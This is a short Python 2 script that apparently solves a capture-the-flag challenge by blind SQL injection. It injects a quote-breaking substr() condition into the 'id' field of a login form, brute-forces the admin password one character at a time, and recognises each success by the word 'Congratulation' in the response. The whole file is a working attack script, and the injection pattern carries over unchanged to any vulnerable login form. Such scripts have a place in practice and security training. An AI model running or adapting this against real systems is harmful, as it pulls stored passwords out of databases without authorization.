import urllib,urllib2
ps = 'FLAG_'
for i in range(6,22):
    ok = False
    for j in range(33,127):
        data = urllib.urlencode({'id':'admin\' AND substr((SELECT pass FROM user WHERE id=\'admin\'),'+ str(i) +',1)=\'' +chr(j) + '\' --','pass':'aa'})
        res = urllib2.urlopen('http://ctfq.sweetduet.info:10080/~q6/',data)
        if 'Congratulation' in res.read():
            ps += chr(j)
            print ps
            ok = True
            break
    if not ok:
        print "Failed"
        break
